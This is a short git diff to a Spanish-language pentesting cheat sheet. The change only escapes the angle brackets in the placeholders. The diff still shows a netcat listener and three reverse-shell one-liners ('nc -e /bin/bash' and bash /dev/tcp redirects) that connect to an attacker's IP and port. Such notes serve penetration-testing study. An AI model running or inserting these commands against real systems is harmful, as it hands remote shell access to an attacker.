@@ -31,11 +31,11 @@ como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```
 
 Y luego usar alguno de los siguientes comandos
 
-> nc -e /bin/bash <IP> <PORT>
+> nc -e /bin/bash \<IP> \<PORT>
 
-> bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+> bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1
 
-> bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" ```
+> bash -c "bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1" ```
 
 #### SMB
 Dentro de una consola de smb, usando por ejemplo smbclient
